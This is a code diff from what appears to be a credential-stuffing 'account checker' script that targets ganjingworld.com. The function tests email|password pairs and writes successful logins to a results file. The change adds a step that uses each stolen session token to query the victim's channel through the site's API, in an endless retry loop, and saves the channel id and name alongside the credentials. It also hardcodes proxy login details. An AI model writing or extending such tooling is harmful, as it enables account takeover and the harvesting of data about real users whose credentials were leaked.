@@ -543,7 +543,23 @@ def check_acc(account, total):
             user_id = a.json()["data"]["user_id"]
             print(f"\033[92m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Login success")
             good += 1
-            open("Result_check_acc.txt", "a", encoding="utf-8").write(f"{email}|{password}|Login success|https://www.ganjingworld.com/channel/{user_id}\n")
+            while True:
+                try:
+                    h = {
+                    "Content-Type": "application/json",
+                    "Authorization": a.json()["data"]["token"],
+                    }
+                    pr = "0JeLKc:G69qYC@hub-us-8.litport.net:31682"
+                    p = {
+                        "http":f"http://{pr}",
+                        "https":f"http://{pr}"
+                    }
+                    data_channel = requests.post("https://gw.ganjingworld.com/v1.0c/get-my-channels", headers=h).json()["data"]["channels"][0]
+                    break
+                except: continue
+            uid = data_channel["id"]
+            name = data_channel["name"]
+            open("Result_check_acc.txt", "a", encoding="utf-8").write(f"{email}|{password}|Login success|https://www.ganjingworld.com/channel/{uid}|{name}\n")
             return
         except Exception as e: 
             pass
